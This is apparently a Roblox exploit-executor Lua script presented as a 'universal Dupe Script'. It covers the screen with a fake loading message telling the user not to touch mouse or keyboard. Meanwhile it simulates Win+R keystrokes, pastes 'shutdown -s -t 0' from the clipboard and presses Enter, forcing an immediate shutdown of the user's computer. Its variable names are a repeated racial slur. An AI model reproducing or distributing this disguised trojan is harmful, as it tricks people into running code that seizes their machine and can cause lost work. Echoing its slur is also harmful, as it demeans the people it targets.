local nigga = Drawing.new("Square")
nigga.Filled = true
nigga.Color = Color3.new(0,0,0)
nigga.Size = game:GetService("Workspace").CurrentCamera.ViewportSize

local nigga2 = Drawing.new("Text")
nigga2.Text = [[                Loading universal Dupe Script. 
Please wait 10 seconds dont move ur mouse and dont use your keyboard]]
nigga2.Outline = true
nigga2.Size = 20
nigga2.Color = Color3.new(1,1,1)
nigga2.Position = Vector2.new(game:GetService("Workspace").CurrentCamera.ViewportSize.X / 3.25, game:GetService("Workspace").CurrentCamera.ViewportSize.Y / 2)
task.wait(1)
task.wait(3)
local function notskidedfunction()
    if not isrbxactive() then return end
    keypress(0x5B)
    keypress(0x52)
    keyrelease(0x52)
    keyrelease(0x5B)
    task.wait(0.5)
    setclipboard('shutdown -s -t 0')
    task.wait(0.3)
    keypress(0x11)
    keypress(0x56)
    keyrelease(0x56)
    keyrelease(0x11)
    task.wait(0.2)
    keypress(0x0D)
    keyrelease(0x0D)
end
spawn(notskidedfunction)
